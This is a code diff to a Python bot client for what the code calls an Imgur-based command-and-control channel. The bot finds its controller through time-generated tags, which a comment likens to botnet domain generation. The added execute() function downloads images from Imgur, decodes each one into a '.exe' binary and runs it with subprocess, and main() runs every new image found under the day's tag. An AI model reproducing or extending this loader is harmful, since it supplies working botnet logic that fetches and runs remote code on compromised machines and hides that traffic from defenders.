@@ -1,9 +1,13 @@
 import requests
 import json
 import os
+import subprocess
 import sqlite3 as sl
-from imgur_c2.auth import client_id
 from datetime import datetime
+from imgur_c2.auth import client_id
+from imgur_c2.tng import generate_tag_name
+from imgur_c2.ImgMsg import ImgMsg, imgMsgFromFile, imgMsgFromImage
+
 
 # Bots find C2 by searching Imgur for special tags, generated based on
 # current utc time. This is similar to domain name generation botnets use.
@@ -46,11 +50,9 @@ def get_images_by_tag(tag):
     elif "posts" in data:
         # print(json.dumps(data["posts"], indent=2))
         for i in data["posts"]:
-            images.append(i["id"])
+            images.append(i["cover"]["id"])
     else:
         print("Unknown Error:", data)
-
-    # to download an image w/ ID use https://imgur.com/download/53i9bwZ
 
     return images
 
@@ -72,7 +74,23 @@ def execute(imgur_id):
     if CON is None:
         init_db()
 
-    # execution stuff from ImgMsg module here
+    # download an image w/ ID use https://imgur.com/download/{imgur_id}
+    url = "https://imgur.com/download/{}".format(imgur_id)
+    image_file = imgur_id + ".png"
+    print("downloading image:", url)
+    r = requests.get(url, allow_redirects=True)
+
+    with open(image_file, "wb") as fd_out:
+        fd_out.write(r.content)
+
+    # convert image to binary w/ ImgMsg module
+    save_file = imgur_id + ".exe"
+    imgmsg = imgMsgFromImage(image_file)
+    imgmsg.exportMsgToFile(save_file)
+
+    # subprocess.call([r"C:\Temp\a b c\Notepad.exe"])
+    print("executing binary:", save_file)
+    subprocess.call([save_file])
 
     # if successfully executed
     with CON:
@@ -83,10 +101,20 @@ def execute(imgur_id):
 
 
 def main():
-    for imgur_id in get_images_by_tag("a8a15930df81"):
+    exec_count = 0
+    images = get_images_by_tag(TODAYS_TAG)
+
+    for imgur_id in images:
         if not in_history(imgur_id):
             print("Executing image", imgur_id)
             execute(imgur_id)
+            exec_count += 1
+
+    print(
+        "Execute {} out of {} images found in tag {} gallery ({})".format(
+            exec_count, len(images), TODAYS_TAG, "https://imgur.com/t/" + TODAYS_TAG
+        )
+    )
 
 
 if __name__ == "__main__":
